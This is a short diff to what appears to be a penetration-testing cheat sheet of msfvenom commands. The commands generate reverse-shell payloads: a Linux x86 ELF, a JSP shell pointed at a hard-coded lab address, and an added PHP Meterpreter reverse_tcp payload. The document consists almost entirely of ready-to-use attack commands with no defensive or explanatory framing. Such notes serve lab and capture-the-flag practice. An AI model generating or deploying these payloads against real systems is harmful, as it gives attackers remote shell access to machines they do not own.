@@ -18,3 +18,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.e
 
 JSP shell, usefull for coldfusion:
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f raw > shell.jsp
+
+PHP Meterpreter shell:
+msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=$port -f raw > php-meterpreter.php
+
